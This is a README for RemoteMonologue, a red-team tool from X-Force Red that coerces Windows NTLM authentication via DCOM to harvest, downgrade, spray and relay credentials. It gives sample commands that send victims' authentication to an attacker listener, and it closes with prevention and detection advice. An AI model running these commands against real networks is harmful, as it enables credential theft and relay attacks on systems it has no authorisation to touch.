# RemoteMonologue

RemoteMonologue is a Windows credential harvesting technique that enables remote user compromise by leveraging the Interactive User RunAs key and coercing NTLM authentications via DCOM. 

Read X-Force Red's [RemoteMonologue: Weaponizing DCOM for NTLM  Authentication Coercions] for detailed information.

## **Features**  

🔹 **Authentication Coercion via DCOM (`-dcom`)**  
- Targets four DCOM objects (`ServerDataCollectorSet`, `FileSystemImage`, `MSTSWebProxy`, `UpdateSession`) to trigger an NTLM authentication against a specified listener (`-auth-to`).  

🔹 **Credential Spraying (`-spray`)**  
- Validate credentials across multiple systems while also capturing user credentials.  

🔹 **NetNTLMv1 Downgrade Attack (`-downgrade`)**  
- Force targets to use NTLMv1, making credential cracking and relaying easier.  

🔹 **WebClient Service Abuse (`-webclient`)**  
- Enables the WebClient service to facilitate HTTP-based authentication coercion.  

🔹 **User Enumeration (`-query`)**  
- Identify users with an active session on the target system.  

**Note:** Local administrator privileges to the target system is required.  

## **Setup**

```bash
pip install impacket
```

## **Examples**

Below is an example of running RemoteMonologue with the NetNTLMv1 downgrade attack while using `Responder` as the listener. By default, if no DCOM option is specified, the tool uses the `ServerDataCollectorSet` DCOM object.

```bash
RemoteMonologue.py domain/user:password@target -auth-to [listener IP] -downgrade
```

![image](https://github.com/user-attachments/assets/ada8f741-754f-4c50-9743-a6d9145f7407)


Below is another example, this time the attack is executed using the `FileSystemImage` DCOM object and enabling the WebClient service to obtain an HTTP authentication, which is then relayed to LDAP using `ntlmrelayx`.

```bash
RemoteMonologue.py domain/user:password@target -auth-to [listener NETBIOS@PORT] -webclient -dcom FileSystemImage
```

![image](https://github.com/user-attachments/assets/f79d879a-ac4b-4436-a453-359d6e2eba72)


## **Defensive Considerations**

To protect against and detect these techniques, there are several preventative and detection measures that can be implemented.

Preventative measures:

1.	Enable LDAP Signing and Channel Binding: Configure LDAP signing enforcement and channel binding on domain controllers to protect the LDAP endpoint from relay attacks. Note: These settings will be enforced by default starting with Windows Server 2025.

2.	Upgrade to the Latest Windows Versions: Upgrade servers to Windows Server 2025 and workstations to Windows 11 version 24H2 to mitigate NetNTLM downgrade attacks, as NTLMv1 has been removed in these versions.

3.	Enforce SMB Signing: Enable and enforce SMB signing on Windows servers to prevent SMB relay attacks.

4.	Implement Strong Password Policies: Enforce strong password requirements to make password cracking attacks more challenging.

Detection opportunities:

1.	Monitor Remote Access to DCOM Objects: Track access to the affected DCOM objects and their specific Properties and Methods to identify unusual activity.

2.	Monitor Registry Modifications: Monitor changes to the RunAs and LmCompatibilityLevel registry keys.

3.	Track WebClient Service Activity: Monitor for instances where the WebClient service is enabled remotely, as this is used to facilitate HTTP-based NTLM authentications.



[RemoteMonologue: Weaponizing DCOM for NTLM  Authentication Coercions]: https://www.ibm.com/think/x-force/remotemonologue-weaponizing-dcom-ntlm-authentication-coercions
